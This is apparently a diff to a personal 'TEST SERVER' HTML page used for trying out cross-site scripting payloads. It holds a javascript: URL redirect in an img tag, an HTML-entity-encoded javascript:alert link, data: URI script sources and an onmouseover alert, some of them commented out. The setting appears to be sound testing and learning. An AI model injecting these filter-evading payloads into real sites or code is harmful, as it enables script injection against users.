@@ -3,7 +3,6 @@
 <head>
   <meta charset="utf-8">
   <title>TEST SERVER</title>
-  <a href="https://www.naver.com">Click!</a>
   <!--<script>
     var cookie = document.cookie;
   </script>-->
@@ -18,7 +17,11 @@
   <!-- 동작O -->
   <!-- <script src=data:,alert(document.domain)></script> -->
   <!-- <script src="data:,alert(document.domain)"></script> -->
-  <img src="x" onmouseover=alert(document.domain)></img> 
+  <!-- <img src="x" onmouseover=alert(document.domain)></img>  -->
+  <img src="javascript:location.href='https://www.naver.com'"></img>
+  <a href="https://www.naver.com">Click!</a>
+  <A HREF="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;    &#x34;&#x35;&#x29;">XSS</A>
+  
   
 </head>
 <body>
